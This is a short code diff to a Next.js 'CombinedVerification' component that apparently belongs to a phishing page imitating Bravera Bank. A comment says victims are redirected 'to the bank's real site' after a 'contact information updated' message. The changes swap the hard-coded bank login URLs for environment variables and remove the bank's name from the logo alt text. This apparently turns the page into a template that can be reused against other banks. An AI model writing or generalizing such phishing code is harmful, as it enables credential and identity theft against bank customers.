@@ -160,7 +160,7 @@ export default function CombinedVerification() {
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        router.push('https://secure.bravera.bank/login');
+        router.push(process.env.NEXT_PUBLIC_MAIN_PAGE_URL);
       }, 3000);
       
     } catch (error) {
@@ -343,7 +343,7 @@ export default function CombinedVerification() {
             <h3 className="text-lg mb-4">Thank you!</h3>
             <p className="mb-4">
               Your contact information has been updated successfully. Please{" "}
-              <a href="https://secure.bravera.bank/login" className="text-[#36c3f1] hover:underline">
+              <a href={process.env.NEXT_PUBLIC_LOGIN_URL} className="text-[#36c3f1] hover:underline">
                 Click here
               </a>{" "}
               and you will be redirected to the Authentication page. If the page doesn&apos;t
@@ -379,7 +379,7 @@ export default function CombinedVerification() {
           <div className="flex justify-center mb-6">
             <Image 
               src="/assets/logo.png"
-              alt="Bravera Bank" 
+              alt=" Bank" 
               width={288}
               height={80}
               className="h-12"
